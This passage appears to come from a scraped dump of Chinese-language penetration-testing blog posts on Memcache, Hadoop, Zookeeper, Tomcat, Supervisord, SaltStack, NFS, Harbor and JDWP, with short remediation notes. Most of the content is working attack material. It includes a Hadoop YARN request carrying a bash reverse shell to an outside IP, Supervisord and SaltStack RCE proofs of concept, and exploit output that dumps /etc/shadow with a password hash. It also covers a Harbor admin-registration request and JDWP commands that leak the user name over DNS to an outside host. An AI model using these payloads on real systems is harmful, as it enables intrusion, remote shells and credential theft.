|more命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在memcached未授权访问漏洞。\n telnet/nc/netstat验证 1 2 3 4 5 6 7 8  telnet 10.198.18.1 11211 stats # 查看memcache 服务状态  stats items # 查看所有items  stats cachedump 32 0 # 获得缓存key  get :state:264861539228401373:261588 # 通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露 crtl+] q # 退出telnet nc -vv 10.198.18.1 11211   MSF相关模块 memcached键值提取器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  msf6 auxiliary(gather/memcached_extractor) \u0026gt; show info Name: Memcached Extractor Module: auxiliary/gather/memcached_extractor License: Metasploit Framework License (BSD) Rank: Normal Provided by: Paul Deardorff \u0026lt;paul_deardorff@rapid7.com\u0026gt; Check supported: No Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.198.18.2 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 11211 yes The target port (TCP) THREADS 1 yes The number of concurrent threads (max one per host)   修复方案  配置访问控制  建立iptables规则，只允许某一ip对memcache的端口进行访问。\n1  iptables -A INPUT -p tcp -s 192.168.0.2 —dport 11211 -j ACCEPT   绑定监听ip\nmemcache如果没有开在外网的必要，可以在memcache启动时绑定ip地址为127.0.0.1  1  memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid    使用普通账号运行，指定memcache用户运行\n  修改默认端口\n修改默认11211监听端口为其他端口\n  1  memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid   ","description":"","id":108,"section":"en","tags":[""],"title":"Memcache","uri":"http://crkmythical.github.io/en/blog/memcache/"},{"content":"Hadoop是一个Apache基金会所开发的分布式基础架构， 核心设计是HDFS（即分布式文件系统）和MapReduce， * HDFS 为海量数据提供存储 * MapReduce为海量数据提供计算\n信息收集 1 2 3 4 5 6 7 8 9 10 11 12 13 14  sudo nmap -sV -Pn -T4 -sSU -p 8088 -sC 192.168.79.207 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 18:32 CST Nmap scan report for 192.168.79.207 Host is up (0.00012s latency). PORT STATE SERVICE VERSION 8088/tcp open http Jetty 6.1.26 |_http-server-header: Jetty(6.1.26) | http-title: All Applications |_Requested resource was http://192.168.79.207:8088/cluster 8088/udp closed radan-http Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds   Hadoop Yarn（ResourceManager REST API)未授权漏洞 YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当， 攻击者利用Hadoop Yarn资源管理系统REST API未授权漏洞对服务器进行远程执行代码。\n手工或BP测试 Payload\nPOST /ws/v1/cluster/apps HTTP/1.1 Host: 127.0.0.1:8088 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Type: application/json Content-Length: 268 { \u0026quot;application-id\u0026quot;:\u0026quot;application_1604979684298_0006\u0026quot;, \u0026quot;application-name\u0026quot;:\u0026quot;test\u0026quot;, \u0026quot;application-type\u0026quot;:\u0026quot;YARN\u0026quot;, \u0026quot;am-container-spec\u0026quot;:{ \u0026quot;commands\u0026quot;:{ \u0026quot;command\u0026quot;:\u0026quot;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.79.28/9999 0\u0026gt;\u0026amp;1\u0026quot; } } }  申请新的application，记录application-id字段 直接通过curl进行POST请求  curl -v -X POST 'http://ip:8088/ws/v1/cluster/apps/new-application' 返回包含如下信息 {\u0026quot;application-id\u0026quot;:\u0026quot;application_1527144634877_20465\u0026quot;,\u0026quot;maximum-resource-capability\u0026quot;:{\u0026quot;memory\u0026quot;:16384,\u0026quot;vCores\u0026quot;:8}} 使用nc监听9999端口 nc -lvvp 9999 直接发送构造好的payload  curl -s -i -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' http://ip:8088/ws/v1/cluster/apps --data-binary @1.json 1.json文件中的内容\n1 2 3 4 5 6 7 8 9 10 11  { \u0026#34;am-container-spec\u0026#34;:{ \u0026#34;commands\u0026#34;:{ \u0026#34;command\u0026#34;:\u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.79.28/9999 0\u0026gt;\u0026amp;1\u0026#34; } }, \u0026#34;application-id\u0026#34;:\u0026#34;application_1527144634877_20465\u0026#34;, \u0026#34;application-name\u0026#34;:\u0026#34;test\u0026#34;, \u0026#34;application-type\u0026#34;:\u0026#34;YARN\u0026#34; }   MSF测试 msf6 exploit(linux/http/hadoop_unauth_exec) \u0026gt; show options Module options (exploit/linux/http/hadoop_unauth_exec): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 127.0.0.1 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 8088 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (linux/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.79.28 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic msf6 exploit(linux/http/hadoop_unauth_exec) \u0026gt; run [*] Started reverse TCP handler on 192.168.79.28:4444 [*] Sending Command [*] Command Stager progress - 100.00% done (823/823 bytes) [*] Sending stage (3008420 bytes) to 192.168.79.28 [*] Meterpreter session 2 opened (192.168.79.28:4444 -\u0026gt; 192.168.79.28:63414) at 2020-11-10 15:44:07 +0800 meterpreter \u0026gt; 修复建议：  如无必要，关闭Hadoop Web管理页面； 开启服务级别身份验证，如Kerberos认证； 部署Knox、Nginx之类的反向代理系统，防止未经授权用户访问； 限制可信任的IP地址才能访问Hadoop默认开放的多个端口  ","description":"","id":109,"section":"en","tags":["aa"],"title":"Hadoop","uri":"http://crkmythical.github.io/en/blog/hadoop/"},{"content":"Zookeeper是一个分布式协调服务的开源框架，主要解决分布式集群中应用系统的一致性问题（避免同时操作同一数据造成脏读问题），本质上是一个分布式的小文件存储系统。\nZookeeper=文件系统+监听通知机制\nZookeeper提供的常见服务：\n 命令服务 按名称标识集群中的节点，类似于DNS 配置管理 加入节点的最近的和最新的系统配置信息 集群管理 实时在集群和节点状态加入/离开节点 选举算法 选举一个节点作为协调目的的leader 锁定和同步服务 在修改数据的同时锁定数据 高度可靠的数据注册表 即使在多个节点关闭时也可获得数据  信息收集 1 2 3 4 5 6 7 8 9  sudo nmap 10.196.20.52 -Pn -T4 -sS -p 2181 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-06 15:33 CST Nmap scan report for 10.196.20.52 Host is up (0.13s latency). PORT STATE SERVICE 2181/tcp open eforward Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds   Zookeeper未授权访问 CVE-2014-085 获取服务信息  conf命令-获取配置信息\necho conf | nc 10.196.20.52 2181  cons命令-获取会话详细信息\necho cons | nc 10.196.20.52 2181 | more dump命令-输出未处理的会话和leader节点\necho dump | nc 10.196.20.52 2181 | more envi命令-输出服务器详细信息\necho envi | nc 10.196.20.52 2181  stat命令-输出统计信息\necho stat | nc 10.196.20.52 2181  ### zkCli客户端连接操作\nzkCli -server 10.196.20.51:2181 Connecting to 10.196.20.51:2181 Welcome to ZooKeeper! JLine support is enabled [zk: 10.196.20.51:2181(CONNECTING) 0] WATCHER:: WatchedEvent state:SyncConnected type:None path:null [zk: 10.196.20.51:2181(CONNECTED) 0] ls / [admin, brokers, cluster, config, consumers, controller, controller_epoch, isr_change_notification, latest_producer_id_block, log_dir_event_notification, zookeeper] [zk: 10.196.20.51:2181(CONNECTED) 1] get /controller {\u0026quot;version\u0026quot;:1,\u0026quot;brokerid\u0026quot;:3,\u0026quot;timestamp\u0026quot;:\u0026quot;1604393865608\u0026quot;} [zk: 10.196.20.51:2181(CONNECTED) 2] get get getAcl getAllChildrenNumber getEphemerals [zk: 10.196.20.51:2181(CONNECTED) 2] getAcl / 'world,'anyone : cdrwa [zk: 10.196.20.51:2181(CONNECTED) 3] 漏洞修复  设置防火墙策略限制 IP 访问 不要将 zookeeper 暴露在外网 设置用户认证和 ACL  ","description":"","id":110,"section":"en","tags":[""],"title":"Zookeeper","uri":"http://crkmythical.github.io/en/blog/zookeeper/"},{"content":"Apache 和 Tomcat 都是web网络服务器，两者既有联系又有区别，在进行HTML、PHP、JSP、Perl等开发过程中，需要准确掌握其各自特点，选择最佳的服务器配置。\nApache是web服务器（静态解析，如HTML），tomcat是java应用服务器（动态解析，如JSP）\nTomcat只是一个servlet(jsp也翻译成servlet)容器，可以认为是apache的扩展，但是可以独立于apache运行\n信息收集 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  sudo nmap -sV -Pn -T4 -sSU -p 8080,8009 -sC 192.168.79.207 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 18:47 CST Nmap scan report for 192.168.79.207 Host is up (0.00012s latency). PORT STATE SERVICE VERSION 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS 8080/tcp open http Apache Tomcat 9.0.30 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/9.0.30 8009/udp closed unknown 8080/udp closed http-alt Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds   Apache Tomcat文件包含漏洞-CNVD-2020-10487/CVE-2020-1938 该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。\n在线检测  https://www.chaitin.cn/en/ghostcat\n Tomcat-AJP文件包含工具\n./CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f WEB-INF/web.xml 10.184.67.100 ","description":"","id":111,"section":"en","tags":[""],"title":"Tomcat","uri":"http://crkmythical.github.io/en/blog/tomcat/"},{"content":"Supervisord是由python开发的进程控制系统，用于管理后台服务的工具， 作用类似于Linux自带的Systemd程序。\nSupervisord采用Client/Server架构， Server跑在系统后台， Client是个命令，通过RPC协议，调用Server提供的API，执行任务。\nRPC协议指Client通过RPC协议可以在Server执行某个函数并得到返回结果。\n信息收集 1 2 3 4 5 6 7 8 9 10 11 12  sudo nmap -sV -Pn -T4 -sSU -p 9001 -sC 192.168.79.207 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 19:10 CST Nmap scan report for 192.168.79.207 Host is up (0.00011s latency). PORT STATE SERVICE VERSION 9001/tcp open http Medusa httpd 1.12 (Supervisor process manager) |_http-server-header: Medusa/1.12 |_http-title: Supervisor Status 9001/udp closed etlservicemgr Nmap done: 1 IP address (1 host up) scanned in 186.59 seconds   Supervisord远程命令执行漏洞-CVE-2017-11610 Requirements：\n Supervisord版本Supervisord 3.0a1 \u0026lt; 3.3.2 RPC端口可被访问 RPC无密码/弱口令  BurpSuite复现 直接执行任意命令：\n POC-1  POST /RPC2 HTTP/1.1 Host: localhost Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 213 \u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt; \u0026lt;methodCall\u0026gt; \u0026lt;methodName\u0026gt;supervisor.supervisord.options.warnings.linecache.os.system\u0026lt;/methodName\u0026gt; \u0026lt;params\u0026gt; \u0026lt;param\u0026gt; \u0026lt;string\u0026gt;touch /tmp/success\u0026lt;/string\u0026gt; \u0026lt;/param\u0026gt; \u0026lt;/params\u0026gt; \u0026lt;/methodCall\u0026gt;  POC-2-慎用(会导致业务程序退出)  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  POST http://192.168.0.15:9001/RPC2 HTTP/1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/xml Content-Type: text/xml Accept-Language: en-GB,en;q=0.5 Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Length: 503 Host: 192.168.0.15:9001 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;methodCall\u0026gt; \u0026lt;methodName\u0026gt;supervisor.supervisord.options.execve\u0026lt;/methodName\u0026gt; \u0026lt;params\u0026gt; \u0026lt;param\u0026gt; \u0026lt;string\u0026gt;/usr/bin/python\u0026lt;/string\u0026gt; \u0026lt;/param\u0026gt; \u0026lt;param\u0026gt; \u0026lt;array\u0026gt; \u0026lt;data\u0026gt; \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;python\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;-c\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;import os; os.system(\u0026#34;touch /tmp/blahh\u0026#34;)\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/data\u0026gt; \u0026lt;/array\u0026gt; \u0026lt;/param\u0026gt; \u0026lt;param\u0026gt; \u0026lt;struct\u0026gt; \u0026lt;/struct\u0026gt; \u0026lt;/param\u0026gt; \u0026lt;/params\u0026gt; \u0026lt;/methodCall\u0026gt;    关于直接回显的POC\n @Ricter 在微博上提出的一个思路，甚是有效，就是将命令执行的结果写入log文件中，再调用Supervisord自带的readLog方法读取log文件，将结果读出来。\n写了个简单的POC： poc.py，直接贴出来吧：\n#!/usr/bin/env python3 import xmlrpc.client import sys target = sys.argv[1] command = sys.argv[2] with xmlrpc.client.ServerProxy(target) as proxy: old = getattr(proxy, 'supervisor.readLog')(0,0) logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')() getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile)) result = getattr(proxy, 'supervisor.readLog')(0,0) print(result[len(old):]) 使用Python3执行并获取结果：./poc.py \u0026quot;http://your-ip:9001/RPC2\u0026quot; \u0026quot;command\u0026quot;：\nMSF反弹shell  需要知道用户密码：espc：what\n Module options (exploit/linux/http/supervisor_xmlrpc_exec): Name Current Setting Required Description ---- --------------- -------- ----------- HttpPassword what no Password for HTTP basic auth HttpUsername espc no Username for HTTP basic auth Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.184.67.1 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 8103 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI /RPC2 yes The path to the XML-RPC endpoint URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (generic/shell_bind_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LPORT 4444 yes The listen port RHOST 10.184.67.1 no The target address 漏洞修复  升级Supervisord 端口访问控制 设置复杂RPC密码  参考：\nSupervisord远程命令执行漏洞\n","description":"","id":112,"section":"en","tags":[""],"title":"Supervisord","uri":"http://crkmythical.github.io/en/blog/supervisord/"},{"content":"SaltStack 是基于 Python 开发的一套C/S架构配置管理工具,是一个服务器基础架构集中化管理平台，具备配置管理，远程执行，监控等功能。\n 4505/4506 SaltStack Master与minions通信的端口 8000 这是Salt的API端口,需要通过https访问  信息收集  nmap -Pn -T4 -sV -p 4505,4506,8000 192.168.79.28 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 12:30 CST Nmap scan report for 192.168.79.28 Host is up (0.00021s latency). PORT STATE SERVICE VERSION 4505/tcp open zmtp ZeroMQ ZMTP 2.0 4506/tcp open zmtp ZeroMQ ZMTP 2.0 8000/tcp open ssl/http CherryPy wsgiserver SaltStack水平权限绕过漏洞 CVE-2020-11651 在 CVE-2020-11651 认证绕过漏洞中，\n攻击者通过构造恶意请求，\n可以绕过 Salt Master 的验证逻辑，\n调用相关未授权函数功能，\n从而可以造成远程命令执行漏洞。\n影响版本：\n SaltStack \u0026lt; 2019.2.4 SaltStack \u0026lt; 3000.2  CVE-2020-11651-poc验证 root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130 [!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort. [+] Salt version: 3000.1 [ ] This version of salt is vulnerable! Check results below [+] Checking salt-master (192.168.115.130:4506) status... ONLINE [+] Checking if vulnerable to CVE-2020-11651... [*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA= root@kalimah:~/salt# MSF漏洞利用 Module options (exploit/linux/misc/saltstack_salt_unauth_rce): Name Current Setting Required Description ---- --------------- -------- ----------- MINIONS .* yes PCRE regex of minions to target RHOSTS 10.190.26.13 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' ROOT_KEY no Master's root key if you have it RPORT 4506 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (python/meterpreter/reverse_https): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.79.28 yes The local listener hostname LPORT 8443 yes The local listener port LURI no The HTTP Path 漏洞修复  SaltStack官方已发布最新版本修复了上述漏洞，建议相关用户及时更新规避风险。https://github.com/saltstack/salt/releases 禁止将Salt Master默认监听端口（4505、4506）向公网开放，并设置为仅对可信对象开放。  [参考]\nSaltStack认证绕过漏洞\nSaltStack认证绕过\nSaltStack任意文件读取 CVE-2020-11652 攻击者可构造恶意请求，读取，写入服务器上任意文件\nCVE-2020-11651-poc工具验证 salt-securiy-backports\n也可验证\nroot@kalimah:~/salt# python2 exploit.py --master 192.168.115.130 -r /etc/shadow [+] Salt version: 2019.2.0 [ ] This version of salt is vulnerable! Check results below [+] Checking salt-master (192.168.115.130:4506) status... ONLINE [+] Checking if vulnerable to CVE-2020-11651... [*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E= [+] Attemping to read /etc/shadow from 192.168.115.130 root:$6$7qfolaa/$3yhszWj/VUJjfPaqr1yO6NLgV/FhHnVT9Pr6spwJ/F0BJw5vFM.3KjtwcnnuGo5uSJJkLrd28jXrmVZUD9nEI/:17812:0:99999:7::: daemon:*:17785:0:99999:7::: bin:*:17785:0:99999:7::: sys:*:17785:0:99999:7::: sync:*:17785:0:99999:7::: games:*:17785:0:99999:7::: man:*:17785:0:99999:7::: [...] SaltStack命令注入漏洞 CVE-2020-16846 2020年11月SaltStack官方披露了CVE-2020-16846和CVE-2020-25592两个漏洞，\n其中CVE-2020-25592允许任意用户调用SSH模块，\nCVE-2020-16846允许用户执行任意命令。\n组合这两个漏洞，将可以使未授权的攻击者通过Salt API执行任意命令。\nBurpSuite复测 POST /run HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: application/x-yaml Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 87 token=12312\u0026amp;client=ssh\u0026amp;tgt=*\u0026amp;fun=a\u0026amp;roster=whip1ash\u0026amp;ssh_priv=aaa|touch%20/tmp/success%3b MSF复测  Module options (exploit/linux/http/saltstack_salt_api_cmd_exec): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.190.75.23 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 8000 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL true no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI / yes Base path URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_python_ssl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.79.28 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port ","description":"","id":113,"section":"en","tags":[""],"title":"SaltStack","uri":"http://crkmythical.github.io/en/blog/saltstack/"},{"content":"NFS 网络文件系统(Network File System) 允许客户端上的用户像访问本地文件一样地访问网络上的文件\n信息收集 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  nmap -Pn -T4 -sV -p111,2049 10.211.55.6 --script rpcinfo Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-27 17:00 CST Nmap scan report for centos-linux.shared (10.211.55.6) Host is up (0.00050s latency). PORT STATE SERVICE VERSION 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100003 3,4 2049/udp6 nfs | 100005 1,2,3 20048/tcp mountd 100021 1,3,4 42555/udp6 nlockmgr | 100024 1 34047/tcp6 status | 100227 3 2049/tcp nfs_acl 2049/tcp open nfs_acl 3 (RPC #100227) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds   NFS共享信息泄露漏洞 CVE-1999-0170 MSF相关模块 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  msf6 auxiliary(scanner/nfs/nfsmount) \u0026gt; show options Module options (auxiliary/scanner/nfs/nfsmount): Name Current Setting Required Description ---- --------------- -------- ----------- PROTOCOL udp yes The protocol to use (Accepted: udp, tcp) RHOSTS 10.211.55.6 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 111 yes The target port (TCP) THREADS 1 yes The number of concurrent threads (max one per host) msf6 auxiliary(scanner/nfs/nfsmount) \u0026gt; run [+] 10.211.55.6:111 - 10.211.55.6 NFS Export: / [*] [*] 10.211.55.6:111 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed   挂载NFS 1 2 3 4 5 6 7 8  \u0026gt; showmount -e 10.211.55.6 # 查看NSF服务器共享目录 Exports list on 10.211.55.6: /root * \u0026gt; mount -t nfs 10.211.55.6:/root /mnt # 挂在NSF服务器共享的/root目录到本地的/mnt目录 \u0026gt; ls /mnt # 查看/mnt目录的文件 anaconda-ks.cfg index.html index.html.1 index.html.2 original-ks.cfg   ","description":"","id":114,"section":"en","tags":[""],"title":"NFS","uri":"http://crkmythical.github.io/en/blog/nfs/"},{"content":"Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，可以用来构建企业内部的Docker镜像仓库\n信息收集 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  sudo nmap -sV -Pn -T4 -sSU -p 80,443 -sC 192.168.79.207 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 19:39 CST Nmap scan report for 192.168.79.207 Host is up (0.0065s latency). PORT STATE SERVICE VERSION 80/tcp filtered http 443/tcp open ssl/http nginx 1.11.5 |_http-server-header: nginx/1.11.5 |_http-title: Harbor | ssl-cert: Subject: commonName=*.mama.cn/organizationName=GZSC/stateOrProvinceName=Guangdong/countryName=CN | Not valid before: 2016-07-08T03:03:28 |_Not valid after: 2017-07-08T03:03:28 |_ssl-date: TLS randomness does not represent time | tls-nextprotoneg: |_ http/1.1 80/udp open|filtered http 443/udp open|filtered https Nmap done: 1 IP address (1 host up) scanned in 132.41 seconds   Harbor任意管理员注册漏洞 CVE-2019-16097 影响版本：\nHarbor 1.7.0-1.8.2，当且仅当镜像仓库开启了用户注册功能\nBurpSuite测试 漏洞存在接口为 /api/users 的 POST 方法，\n当提交的用户参数中包含 has_admin_role: true 时，则可直接注册创建权限为管理员的账号，\n并且可上传写入恶意 Docker 镜像，进而可直接感染使用此镜像仓库的 Docker 主机。\nPOST /api/users HTTP/1.1 Host: 127.0.0.1 Content-Length: 131 Accept: application/json Origin: http://127.0.0.1 User-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14 Content-Type: application/json Referer: http://127.0.0.1/harbor/sign-in Accept-Language: zh-CN,zh;q=0.9 Cookie: sid=5bb9aad90164bd2ed5274edaf20f9c81 Connection: close {\u0026quot;username\u0026quot;:\u0026quot;mrhonest\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;mrhonest@qq.com\u0026quot;,\u0026quot;realname\u0026quot;:\u0026quot;mrhonest\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;111111Aaa\u0026quot;,\u0026quot;comment\u0026quot;:\u0026quot;11111\u0026quot;,\u0026quot;has_admin_role\u0026quot;:true} 注册时抓包 添加poc  \u0026quot;has_admin_role\u0026quot;:true  管理员权限 Python脚本 harbor添加管理员漏洞检测工具\n","description":"","id":115,"section":"en","tags":[""],"title":"Harbor","uri":"http://crkmythical.github.io/en/blog/harbor/"},{"content":"JDWP（Java DEbugger Wire Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，\n通过该协议，Debugger 端可以和 target VM 通信，可以获取目标 VM的包括类、对象、线程等信息。\n在调试Android应用程序这一场景中，\n Debugger一般是指你的 develop machine 的某一支持 JDWP协议的工具例如 Android Studio 或者 JDB， Target JVM是指运行在你mobile设备当中的各个App（因为它们都是一个个虚拟机 Dalvik 或者 ART）， JDWP Agent一般负责监听某一个端口，当有 Debugger向这一个端口发起请求的时候，Agent 就转发该请求给 target JVM并最终由该 JVM 来处理请求，并把 reply 信息返回给 Debugger 端。  信息收集 \u0026gt;\u0026gt;\u0026gt;nmap -Pn -T4 -sV -p 2005 10.184.67.1 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-03 16:54 CST Nmap scan report for 10.184.67.1 Host is up (0.043s latency). PORT STATE SERVICE VERSION 2005/tcp open jdwp Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_45 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 2.72 seconds 不靠谱 \u0026gt;\u0026gt;\u0026gt;nmap -Pn -T4 -sV -p 2005 --script jdwp-exec --script-args cmd=\u0026quot;date\u0026quot; 10.184.67.1 \u0026gt;\u0026gt;\u0026gt;nmap -Pn -T4 -sV -p 2005 --script jdwp-info,jdwp-inject 10.184.67.1 JDWP远程代码执行漏洞 telnnet 120.197.8.190 8000后，查看回显，如果出现“JDWP-Handshake”，则证明漏洞存在。\nFofa语法 语法：banner=”jdwp”\n120.197.8.190\n测试是否存在 telnet/nc端口后，输入命令JDWP-Handshake\n如果返回JDWP-Handshake，证明存在漏洞。\n{ echo \u0026quot;JDWP-Handshake\u0026quot;; sleep 20 } | telnet 221.221.221.221 10010 { echo \u0026quot;JDWP-Handshake\u0026quot;; sleep 1 | trap exit INT} | nc 221.221.221.221 10010 IOActive/jdwp-shellifier利用  远程命令执行\n本地执行python jdwp-shellifier.py -t 120.197.8.190 -p 8000 \u0026ndash;break-on \u0026ldquo;java.lang.String.indexOf\u0026rdquo; \u0026ndash;cmd \u0026ldquo;whoami\u0026rdquo;   ./jdwp-shellifier.py -t 10.184.67.1 -p 2005 --break-on \u0026quot;java.lang.String.indexOf\u0026quot; --cmd \u0026quot;whoami\u0026quot; [+] Targeting '10.184.67.1:2005' [+] Reading settings for 'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_45' [+] Found Runtime class: id=5456 [+] Found Runtime.getRuntime(): id=7f9cb41916c0 [+] Created break event id=2 [+] Waiting for an event on 'java.lang.String.indexOf' [+] Received matching event from thread 0x5542 [+] Selected payload 'whoami' [+] Command string object created id:5543 [-] Unexpected returned type: expecting Object [!] Command successfully executed 执行whoami，显示执行成功，但是没回显，无法探知。\n 远程命令执行（回显）  本地执行python jdwp-shellifier.py -t 120.197.8.190 -p 8000 \u0026ndash;break-on \u0026ldquo;java.lang.String.indexOf\u0026rdquo; \u0026ndash;cmd \u0026ldquo;ping `whoami`.http://ip.port.grqjsg.ceye.io\u0026quot;\n得到远程主机的用户名为：root\n 反弹SHELL  安装ncat\n./jdwp-shellifier.py -t 10.184.67.1 -p 2005 --break-on \u0026quot;java.lang.String.indexOf\u0026quot; --cmd \u0026quot;sudo yum install -y nc\u0026quot; 反弹shell\n./jdwp-shellifier.py -t 10.184.67.1 -p 2005 --break-on 